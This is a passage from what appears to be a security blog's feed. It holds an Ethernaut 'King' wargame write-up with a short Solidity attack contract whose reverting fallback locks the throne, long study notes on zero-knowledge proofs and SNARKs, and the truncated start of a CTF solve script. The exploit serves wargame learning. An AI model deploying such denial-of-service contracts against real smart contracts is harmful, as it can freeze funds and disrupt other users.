MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›®æ ‡æ˜¯å‘é€å¤§äº1000000000000000çš„weiæˆä¸ºkingï¼Œè€Œä¸”ä¸èƒ½è®©ç›®æ ‡åˆçº¦æ›¿ä»£è‡ªå·±æˆä¸ºking</p><p>è€ƒå¯Ÿçš„æ˜¯transferå‡½æ•°ï¼š</p><p><img src="/images/ethernaut/image-20230406182805634.png" alt="image-20230406182805634"></p><p>å¦‚æœtransferæ‰§è¡Œå¤±è´¥ä¼šè¿›è¡Œå›é€€ï¼Œè€Œcallå’Œsendå‡½æ•°åˆ™ä¸æ˜¯ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªfalse</p><p>ç”¨ remix éƒ¨ç½²åˆçº¦ï¼Œåªéœ€è¦æ„é€ ä¸€ä¸ªæ²¡æœ‰ payable çš„å›é€€å‡½æ•°æˆ–è€…å‹æ ¹æ²¡æœ‰fallbackå‡½æ•°ï¼Œå°±æ¥æ”¶ä¸åˆ°é‡‘é¢äº†</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function attack(address _addr) public payable&#123;</span><br><span class="line">        _addr.call.gas(10000000).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/ethernaut/image-20230406183005656.png" alt="image-20230406183005656"></p><p>åè®°ï¼š</p><p>Most of Ethernautâ€™s levels try to expose (in an oversimplified form of course) something that actually happened â€” a real hack or a real bug.</p><p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a>.</p><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a><strong>Re-entrancy</strong></h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ‰“é¶åœºçš„è®°å½•&lt;/p&gt;</summary>
    
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>Zero Knowledge Proofs</title>
    <link href="http://sh1k4ku.github.io/2023/01/30/Zero-Knowledge-Proofs/"/>
    <id>http://sh1k4ku.github.io/2023/01/30/Zero-Knowledge-Proofs/</id>
    <published>2023-01-30T14:15:01.000Z</published>
    <updated>2023-06-26T08:34:42.537Z</updated>
    
    <content type="html"><![CDATA[<p>This is the record of my study of ZKP</p><span id="more"></span><p>latexæ˜¯çœŸéš¾æ•²è¿™äº›å¯†ç å­¦å®šä¹‰ï¼Œå¹²è„†æˆªå›¾</p><h1 id="Introduction-and-History-of-ZKP"><a href="#Introduction-and-History-of-ZKP" class="headerlink" title="Introduction and History of ZKP"></a>Introduction and History of ZKP</h1><h2 id="what-is-Proofs"><a href="#what-is-Proofs" class="headerlink" title="what is Proofs"></a>what is Proofs</h2><p>Mainly to introduce some definitionsï¼š</p><p><strong>Proofs</strong>: For a <strong>Claim</strong>, the <strong>Prover</strong> provides a <strong>proof</strong> <strong>w</strong> to prove the correctness of the <strong>Claim</strong> <strong>x</strong>, and the <strong>Verifier</strong> decides to accept/reject based on the <strong>proof</strong></p><script type="math/tex; mode=display">\begin{align*}\label{2}  & \rm \textbf{Def: A language }\textit{L} \text{ is a set of binary strings x}\\\end{align*}</script><p><img src="/images/Zero-Knowledge-Proofs/image-20230522224623815-1687768159269-1687768206432.png" alt="image-20230522224623815"></p><p>For example: Large number factoring(N = p*q), quadratic residue(y, N), the two graphs are isomorphic.</p><p><strong>Zero Knowledge Proofs</strong> means <strong>Prover</strong> prove that I could prove it If I felt like it.</p><h2 id="Zero-Knowledge-Interactive-Proofs"><a href="#Zero-Knowledge-Interactive-Proofs" class="headerlink" title="Zero Knowledge Interactive Proofs"></a>Zero Knowledge Interactive Proofs</h2><p>there are Two New Ingredients: <strong>Interactive</strong> and <strong>Probabilistic Proofs</strong>:</p><ul><li><strong>Interaction</strong>: rather than passively â€œreadingâ€ proof, <strong>verifier</strong> engages in a non-trivial <strong>interaction</strong> with the <strong>prover</strong>.</li><li><strong>Randomness</strong>: verifier is randomized (tosses coins as a primitive operation), and can err in accept/reject with small probability</li><li>PS: the prover can compute in unbounded time, but the verifier can just compute in Polynominal-time(<strong>PPT</strong>)</li></ul><p>e.g., the prover proves to the color-blind verifier that a flag has two colors, the verifier flips a coin to decide whether to flip the flag, and the prover guesses the result of the coin based on the flagsâ€™ obverse and reverse. And if we repeat the progress k times, the <script type="math/tex">prob_{coins}(\text{verifier accept)}\leq (1/2)^k</script></p><h3 id="Define-Interactive-Proofs"><a href="#Define-Interactive-Proofs" class="headerlink" title="Define Interactive Proofs"></a>Define Interactive Proofs</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523142952475-1687768226894.png" alt="image-20230523142952475"></p><script type="math/tex; mode=display">\begin{align*}\label{1}  & \text{completeness means if x} \in L,\;V\text{ always accepts}\\ & \text{soundness means if x} \notin L,\; \text{for all } \textcolor[rgb]{0,0,1}{cheating \;prover\;strategy},V \text{ will not accept except with negligible probability. }\end{align*}</script><p>so  class of languages <strong>IP = {L for which there is an interactive proof}</strong></p><h3 id="What-is-zero-knowledge"><a href="#What-is-zero-knowledge" class="headerlink" title="What is zero-knowledge"></a>What is zero-knowledge</h3><p>For true Statements, What the verifier can compute <strong>after</strong> the interaction = What the verifier could have computed before interaction</p><p>Now we introduce the concept of simulation paradigm</p><h3 id="The-Simulation-Paradigm"><a href="#The-Simulation-Paradigm" class="headerlink" title="The Simulation Paradigm"></a>The Simulation Paradigm</h3><p>Vâ€™s view gives him nothing new, if he could have simulated it its own s.t <code>simulated view</code> and <code>real-view</code> are <strong>computationally-Indistinguishable</strong></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523150750929.png" alt="image-20230523150750929"></p><p>Working through a Simulation for QR Protocol:</p><script type="math/tex; mode=display">view_V(P,V):\\Transcript = (s, b, z)\\Coins = b</script><p>so the output of simulation should be (s, b, z)</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523152110707.png" alt="image-20230523152110707"></p><h3 id="Computational-Indistinguishability"><a href="#Computational-Indistinguishability" class="headerlink" title="Computational Indistinguishability"></a>Computational Indistinguishability</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523150823383.png" alt="image-20230523150823383"></p><p>For all distinguisher algorithms D, even after receiving a polynomial number of samples from <script type="math/tex">D_b, \text{Prob[D guesses b] <1/2 + negl(k)}</script></p><h3 id="Zero-Knowledge-Definition"><a href="#Zero-Knowledge-Definition" class="headerlink" title="Zero Knowledge: Definition"></a>Zero Knowledge: Definition</h3><p>An Interactive Protocol (P,V) is zero-knowledge for a language <script type="math/tex">L</script> if  there exists a <script type="math/tex">\textcolor[rgb]{0,0,1}{PPT}</script> algorithm Sim (a simulator) such that <script type="math/tex">\text{for every x} \in L,</script> the following two probability distributions are <script type="math/tex">\textcolor[rgb]{0,0,1}{poly-time}</script> indistinguishable:</p><ol><li><script type="math/tex; mode=display">View_V(P,V)[x] = {(q_1,a_1,q_2,a_2,â€¦,coins\;of\; V)}</script></li><li><script type="math/tex; mode=display">Sim(x, 1^{\lambda}),\lambda\text{- security parameter allows sufficient Runtime onn small x}</script></li></ol><p>and we can get the <strong>define</strong>: (P,V) is a zero-knowledge interactive protocol if it is complete, sound and zero-knowledge.</p><p>but what if V is not honest? we need a further definition:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523153110540.png" alt="image-20230523153110540"></p><p>also, there are several types of ZK:</p><ul><li>Computationally indistinguishable distributions = CZK</li><li>Perfectly identical distributions = PZK</li><li>Statistically close distributions = SZK</li></ul><h2 id="ZK-proof-of-Knowledge"><a href="#ZK-proof-of-Knowledge" class="headerlink" title="ZK proof of Knowledge"></a>ZK proof of Knowledge</h2><p>it seems prover can not only prove the claim x(e.g. y is the quadratic residual under mode N), but also she knows more(the square root of y mod N), so we need extractor to get the knowledge.</p><p>the concept of ZKPOK is as follows:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523193610535.png" alt="image-20230523193610535"></p><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="do-all-NP-Languages-have-Zero-Knowledge-Interactive-Proofs"><a href="#do-all-NP-Languages-have-Zero-Knowledge-Interactive-Proofs" class="headerlink" title="do all NP Languages have Zero Knowledge Interactive Proofs?"></a>do all NP Languages have Zero Knowledge Interactive Proofs?</h3><p>the answer is <strong>yes</strong>!</p><p><strong>Theorem[GMW86,Naor]</strong>: If one-way functions exist, then every L in NP has computational zero knowledge interactive proofs</p><p>the ideas of the proof:</p><ol><li><strong>[GMW87]</strong> Showed ZK interactive proof for G3-COLOR using bit- commitments <ul><li>for any L in NP, <script type="math/tex">L <_p \text{G3-COLOR}</script>(due to NPC reducibility)</li><li>every instance x can be reduced to graph <script type="math/tex">G_x</script> such that:<ul><li>if x in L the  <script type="math/tex">G_x</script> is 3 colorable; if not,  <script type="math/tex">G_x</script> is not 3 colorable</li></ul></li></ul></li><li><strong>[Naor]</strong> showed if One Way Function exits, then bit commitment protocol exits.</li></ol><h3 id="Bit-Commitment-Protocol"><a href="#Bit-Commitment-Protocol" class="headerlink" title="Bit Commitment Protocol"></a>Bit Commitment Protocol</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523195408388.png" alt="image-20230523195408388"></p><p>i think itâ€™s a kind of variant of signature?</p><p>CZK examples</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523195948302.png" alt="image-20230523195948302"></p><h3 id="quiz"><a href="#quiz" class="headerlink" title="quiz"></a>quiz</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201302340.png" alt="image-20230523201302340"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201308019.png" alt="image-20230523201308019"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201313789.png" alt="image-20230523201313789"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201318111.png" alt="image-20230523201318111"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230523201324211.png" alt="image-20230523201324211"></p><h1 id="Overview-of-Modern-SNARK-Constructions"><a href="#Overview-of-Modern-SNARK-Constructions" class="headerlink" title="Overview of Modern SNARK Constructions"></a>Overview of Modern SNARK Constructions</h1><p>this class is focusing on <strong>None-Interactive Proof</strong></p><h2 id="What-is-a-SNARK"><a href="#What-is-a-SNARK" class="headerlink" title="What is a SNARK?"></a>What is a SNARK?</h2><h3 id="review-arithmetic-circuits"><a href="#review-arithmetic-circuits" class="headerlink" title="review arithmetic circuits"></a>review arithmetic circuits</h3><p>arithmetic circuits: <script type="math/tex">C: \text{F}^n \rightarrow \text{F and |C| = # gates in }C</script></p><h4 id="categories"><a href="#categories" class="headerlink" title="categories"></a>categories</h4><ul><li>An <u>unstructured circuit</u>: a circuit with arbitrary wires</li><li>A <u>structured circuit</u>: <img src="/images/Zero-Knowledge-Proofs/image-20230524222300092.png" alt="image-20230524222300092"></li></ul><p><strong>M is often called a virtual machine (VM) â€” one step of a processor</strong></p><h3 id="preprocessing-NARK-Non-interactive-ARgument-of-Knowledge"><a href="#preprocessing-NARK-Non-interactive-ARgument-of-Knowledge" class="headerlink" title="(preprocessing) NARK: Non-interactive ARgument of Knowledge"></a>(preprocessing) NARK: Non-interactive ARgument of Knowledge</h3><p>Definition:</p><script type="math/tex; mode=display">Premilinary:\\ \text{public arithmetic circuit: }C(x,w) \rightarrow \text{F}\\ \text{where } x\text{ is the statement in }F^n, \text{and }w\text{ is the secret witness in }F^m\\ \text{Preprocessing(setup): S(}C\text{)}\rightarrow \text{public parameters }(pp, vp)\\\text{so a preprocessing NARK is a triple }(S,P,V):\\\begin{align*}\label{3}& \bullet\text{S(C)} \rightarrow \text{public parameters (pp, vp) for prover and verifier}\\& \bullet\text{P(pp, x, w)} \rightarrow \text{proof }\pi\\& \bullet\text{V(vp, x, }\pi \text{)} \rightarrow \text{accept or reject}\end{align*}</script><p><img src="/images/Zero-Knowledge-Proofs/image-20230524223927289.png" alt="image-20230524223927289"></p><h4 id="requirements-informal"><a href="#requirements-informal" class="headerlink" title="requirements (informal)"></a>requirements (informal)</h4><p><img src="/images/Zero-Knowledge-Proofs/image-20230524223949298.png" alt="image-20230524223949298"></p><h4 id="Types-of-preprocessing-Setup"><a href="#Types-of-preprocessing-Setup" class="headerlink" title="Types of preprocessing Setup"></a>Types of preprocessing Setup</h4><p>Setup for circuit C: <script type="math/tex">S(C, r) \rightarrow \text{public parameters }(pp, vp)</script> where r is a random bit</p><ul><li>trusted setup per circuit: S(C, r) random r must be kept secret from prover </li><li><p>trusted but universal (updatable) setup: secret r is independt of C</p><ul><li><script type="math/tex; mode=display">S = (S_{init}, S_{index})</script></li><li><script type="math/tex; mode=display">S_{init}(\lambda;r)\rightarrow \text{gp, which is one-time setup by secret r}</script></li><li><script type="math/tex; mode=display">S_{index}(gp,C)\rightarrow(pp, vp), \text{which is used many times}</script></li></ul></li><li><p>transparent setup: S(C) does not use secret data(or trusted setup)</p></li></ul><p>for example:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230524225626646.png" alt="image-20230524225626646"></p><h4 id="knowledge-soundness"><a href="#knowledge-soundness" class="headerlink" title="knowledge soundness"></a>knowledge soundness</h4><script type="math/tex; mode=display">\text{how can we know P "know" w?} \rightarrow \text{P knows w, if w can be extracted from P}</script><p><img src="/images/Zero-Knowledge-Proofs/image-20230524230400145.png" alt="image-20230524230400145"></p><p>I think the A here is to consider all P (honest d + malicious)</p><h3 id="SNARK-a-Succinct-ARgument-of-Knowledge"><a href="#SNARK-a-Succinct-ARgument-of-Knowledge" class="headerlink" title="SNARK: a Succinct ARgument of Knowledge"></a>SNARK: a Succinct ARgument of Knowledge</h3><p>a succinct proprocessing NARK is a triple(S, P, V) balabala(see above)</p><ul><li>need a <strong>short</strong> proof (len(<script type="math/tex">\pi</script>)=sublinear(|w|))</li><li>fast to verify (time(V)=<script type="math/tex">O_\lambda(|x|, sublinear(|C|))</script>)  (allowing verifier sufficient time to know x but cant learn all of C, so vp is a short summary of circuit)</li></ul><p>so SNARK is a <strong>NARK</strong>(with complete and knowledge sound) that is succinct.</p><p>zk-SNARK is a SNARK that is also zero knowledge</p><h2 id="Building-an-efficient-SNARK"><a href="#Building-an-efficient-SNARK" class="headerlink" title="Building an efficient SNARK"></a>Building an efficient SNARK</h2><p>we just need two steps to get a <strong>SNARK for general circuits</strong>, combining:</p><ul><li><strong>A functional commitment scheme</strong> (Cryptographic object)</li><li><strong>A compatible interactive oracle proof</strong>(IOP, which is information theoretic object)</li></ul><h4 id="Commitments"><a href="#Commitments" class="headerlink" title="Commitments"></a>Commitments</h4><p><strong>two algorithms</strong>:</p><ul><li><script type="math/tex; mode=display">commit(m,r)\rightarrow com \;\;\;\;\;\text{(r chosen at random)}</script></li><li><script type="math/tex; mode=display">verify(m,com,r)\rightarrow \text{accept or reject}</script></li></ul><p>Properties: (informal)</p><ul><li>binding: <script type="math/tex">\rightarrow \text{a malicious committer cant produce a commitment and there is no two valid openings for com}</script></li><li>hiding: <script type="math/tex">\rightarrow \text{com reveals nothing about committed data}</script></li></ul><p><u>for example:</u></p><p>use Hash function as commitment</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130450691.png" alt="image-20230525130450691"></p><h5 id="Committing-to-a-function"><a href="#Committing-to-a-function" class="headerlink" title="Committing to a function"></a>Committing to a function</h5><p>next picture shows <strong>how</strong> to committe to a function:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130646106.png" alt="image-20230525130646106"></p><p>the <strong>definition</strong> of committing to a function:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130843430.png" alt="image-20230525130843430"></p><h5 id="Four-important-functional-commitments"><a href="#Four-important-functional-commitments" class="headerlink" title="Four important functional commitments"></a>Four important functional commitments</h5><p><img src="/images/Zero-Knowledge-Proofs/image-20230525130947030.png" alt="image-20230525130947030"></p><h5 id="equality-test-protocol"><a href="#equality-test-protocol" class="headerlink" title="equality test protocol"></a>equality test protocol</h5><p>there is a useful observation:</p><script type="math/tex; mode=display">\text{for a }f\in F_{p}^{(\leq d)}[X],\text{ and } r \stackrel{$}{\leftarrow}F_p: Pr[f(r) = 0] \leq d/p \;(*)\\\text{suppose p}    \approx2^{256} \text{and d}    \leq 2^{40},\text{the d/p is negligible}\\\text{so for }r \stackrel{$}{\leftarrow}F_p: \text{ if f(r)=0 then f is identically zero w.h.p}\\\text{this is a simple zere test for a committed polynomial}</script><p>furtherï¼Œ <strong>SZDL lemma</strong>: (*) also holds for multivariate polynomials (where d is total degree of f)</p><p>now we can get this:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132124326.png" alt="image-20230525132124326"></p><p>which is a simple <strong>equality test</strong> for two committed polynomials.</p><p>so the equalitty test protocol is:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132221418.png" alt="image-20230525132221418"></p><p>but this is interactive, we want <strong>none-interactive</strong> to make it a SNARK, the <strong>Fiat-Shamir transform</strong> can do it.</p><p><strong>The Fiat-Shamir transform</strong>: <script type="math/tex">H:M\rightarrow R \text{ a cryptographic hash function}</script>, the idea: prover generates verifierâ€™s random bits on its own using H</p><p>H is also modeled as a Random Oracle (RO)</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525132556241.png" alt="image-20230525132556241"></p><p>now we can get a SNARK for polynomial equality testing (just let the r generated by H)</p><h4 id="F-IOP-Poly-IOP"><a href="#F-IOP-Poly-IOP" class="headerlink" title="F-IOP (Poly IOP)"></a><script type="math/tex">F-IOP</script> (Poly IOP)</h4><p><strong>Goal</strong>: make a functional commitment to a SNARK for general circuits</p><p><em>example</em> :</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525164356620.png" alt="image-20230525164356620"></p><p>Hereâ€™s how F-IOP works:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525165835815.png" alt="image-20230525165835815"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525165846209.png" alt="image-20230525165846209"></p><p>properties:</p><ul><li><strong>Complete</strong>: <script type="math/tex">if \; \exists w:C(x,w)=0 \text{ then Pr[verifier accepts]=1}</script></li><li>(Unconditional) knowledge sound (as an IOP): [<script type="math/tex">\text{extractor is given }(x, f_1,r_1,...,r_{t-1}, f_t) \text{ and outputs w}</script>]</li><li>Optional: <strong>Zero knowledge</strong> (for a zk-SNARK)</li></ul><p><em>example</em>:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525171633287.png" alt="image-20230525171633287"></p><p>although this process is interactive, we can use Fiat-Sharmir transformer to turn it to an none-interactive process(SNARK)</p><h2 id="Miscellaneous-1"><a href="#Miscellaneous-1" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="question"><a href="#question" class="headerlink" title="question"></a>question</h3><ol><li>In the Poly-IOP example listed above, sending the commitment of f and q to the verifier is what is done. According to the definition of commitment, there needs to be f and random r to open and verify, but apparently the verifier does not have this data<br>(This problem also exists in other examples) (this problem may be because I do not know about commitment)</li></ol><h3 id="quiz-1"><a href="#quiz-1" class="headerlink" title="quiz"></a>quiz</h3><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190022314.png" alt="image-20230525190022314"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190028070.png" alt="image-20230525190028070"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190035739.png" alt="image-20230525190035739"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230525190040511.png" alt="image-20230525190040511"></p><h1 id="Libraries-and-Compilers-to-build-ZKP"><a href="#Libraries-and-Compilers-to-build-ZKP" class="headerlink" title="Libraries and Compilers to build ZKP"></a>Libraries and Compilers to build ZKP</h1><p>introducting how to instance a zkp</p><h2 id="ZKP-Programmability"><a href="#ZKP-Programmability" class="headerlink" title="ZKP Programmability"></a>ZKP Programmability</h2><p>something about <script type="math/tex">\phi</script>:</p><ol><li>in theory, witness w can be a factorization of integer x, is the sk for pk x</li><li>in practice, <script type="math/tex">\phi</script> is an â€œ<strong>arithmetic circuit</strong>â€œ, over inputs x and w.</li></ol><p>AC as circuit has inputs, gates and wires</p><h3 id="R1CS-format-for-ZKP-ACs"><a href="#R1CS-format-for-ZKP-ACs" class="headerlink" title="R1CS: format for ZKP ACs"></a>R1CS: format for ZKP ACs</h3><ul><li>x: field elements <script type="math/tex">x_1, ...x_l</script></li><li>w: <script type="math/tex">w_1, ...w_{m-l-1}</script></li><li><script type="math/tex; mode=display">\phi$$: n equations of form:- $$\alpha \times\beta=\gamma</script></li></ul><p><img src="/images/Zero-Knowledge-Proofs/image-20230602152443353.png" alt="image-20230602152443353"></p><p>The definition of the extension is matrix-based, but we can treat each of these row vectors as a linear R1CS:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602152726766.png" alt="image-20230602152726766"></p><p>The next step is to build R1CS from three parts: HDL, Library, Compiler, using examples that are all Sudoku</p><h2 id="HDL-use-Circom"><a href="#HDL-use-Circom" class="headerlink" title="HDL(use Circom)"></a>HDL(use Circom)</h2><p>PL VS HDL:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602160136344.png" alt="image-20230602160136344"></p><p>Circom does:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602161417667.png" alt="image-20230602161417667"></p><p><a href="https://docs.circom.io/">https://docs.circom.io/</a></p><p>there are several basic method in the code, like judging two nums not equal, num in range of 4bits, and advanced applications.</p><p>code: <a href="https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/circom/sudoku.circom">https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/circom/sudoku.circom</a></p><h2 id="library-use-arkwork"><a href="#library-use-arkwork" class="headerlink" title="library(use arkwork)"></a>library(use arkwork)</h2><p><img src="/images/Zero-Knowledge-Proofs/image-20230602162155729.png" alt="image-20230602162155729"></p><p>so we can just use this library in some certain pl, just using their syntax.</p><p><a href="https://github.com/arkworks-rs/r1cs-tutorial/">https://github.com/arkworks-rs/r1cs-tutorial/</a></p><p>code: <a href="https://github.com/rdi-berkeley/zkp-course-lecture3-code/tree/main/arkworks">https://github.com/rdi-berkeley/zkp-course-lecture3-code/tree/main/arkworks</a></p><h2 id="compiler-use-ZoKrates"><a href="#compiler-use-ZoKrates" class="headerlink" title="compiler(use ZoKrates)"></a>compiler(use ZoKrates)</h2><p>the idea of this way is using variables, functions, and arrays in the circuit. </p><p>but there is <strong>no way</strong> to compute witness(?), all witness must be provided as input.</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602162911169.png" alt="image-20230602162911169"></p><p>code:<a href="https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/zokrates/root.zok">https://github.com/rdi-berkeley/zkp-course-lecture3-code/blob/main/zokrates/root.zok</a></p><h2 id="An-overview-of-prominent-ZKP-toolchains"><a href="#An-overview-of-prominent-ZKP-toolchains" class="headerlink" title="An overview of prominent ZKP toolchains"></a>An overview of prominent ZKP toolchains</h2><p>comparison:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163154657.png" alt="image-20230602163154657"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163200099.png" alt="image-20230602163200099"></p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163204782.png" alt="image-20230602163204782"></p><p>other tools:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163225247.png" alt="image-20230602163225247"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>quiz:</p><p><img src="/images/Zero-Knowledge-Proofs/image-20230602163954149.png" alt="image-20230602163954149"></p><h1 id="Interactive-Proofs"><a href="#Interactive-Proofs" class="headerlink" title="Interactive Proofs"></a>Interactive Proofs</h1><p>Introducing ip and checksum protocols</p><h1 id="Plonk-Interactive-Oracle-Proofs-IOP"><a href="#Plonk-Interactive-Oracle-Proofs-IOP" class="headerlink" title="Plonk Interactive Oracle Proofs (IOP)"></a>Plonk Interactive Oracle Proofs (IOP)</h1><p>introducing widely used SNARK called Plonk, understanding all the component that make up the SNARK.</p><h1 id="Discrete-log-based-Polynomial-Commitments"><a href="#Discrete-log-based-Polynomial-Commitments" class="headerlink" title="Discrete-log-based Polynomial Commitments"></a>Discrete-log-based Polynomial Commitments</h1><h1 id="ZKP-based-on-Error-Correcting-Codes"><a href="#ZKP-based-on-Error-Correcting-Codes" class="headerlink" title="ZKP based on Error-Correcting Codes"></a>ZKP based on Error-Correcting Codes</h1><h2 id="error-correcting-codes"><a href="#error-correcting-codes" class="headerlink" title="error-correcting codes"></a>error-correcting codes</h2><h2 id="polynomial-commitment-based-on-error-correcting-codes"><a href="#polynomial-commitment-based-on-error-correcting-codes" class="headerlink" title="polynomial commitment based on error-correcting codes"></a>polynomial commitment based on error-correcting codes</h2><h2 id="linear-time-encodable-code-based-on-expanders"><a href="#linear-time-encodable-code-based-on-expanders" class="headerlink" title="linear-time encodable code based on expanders"></a>linear-time encodable code based on expanders</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;This is the record of my study of ZKP&lt;/p&gt;</summary>
    
    
    
    <category term="ZKP" scheme="http://sh1k4ku.github.io/categories/ZKP/"/>
    
    
    <category term="ZKP" scheme="http://sh1k4ku.github.io/tags/ZKP/"/>
    
  </entry>
  
  <entry>
    <title>ç¥¥äº‘æ¯</title>
    <link href="http://sh1k4ku.github.io/2022/10/30/2022/%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2022/10/30/2022/%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2022-10-30T08:01:35.000Z</published>
    <updated>2022-10-30T08:05:47.704Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬äºŒæ¬¡å‚åŠ äº†ï¼Œæ—¶é—´å¥½å¿«å‘€</p><span id="more"></span><h3 id="tracing"><a href="#tracing" class="headerlink" title="tracing"></a>tracing</h3><p>å¤§æ¦‚çš„é€»è¾‘å°±æ˜¯ä»æ—¥å¿—é€†æ¨å‡ºphi</p><p>ä»æœ€åè¿™é‡Œreturn aå¯ä»¥çœ‹å‡ºsä¸€ç›´æ˜¯0</p><p><img src="../images/%E7%A5%A5%E4%BA%91%E6%9D%AF/asynccode" alt="img"></p><p>ï¼Œæ‰€ä»¥åªæœ‰ä¸‰ç§æƒ…å†µï¼Œåˆ†åˆ«åˆ¤å®šç„¶åé€†å°±è¡Œäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">if_exc</span>(<span class="params">ct</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a, b = b, a&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 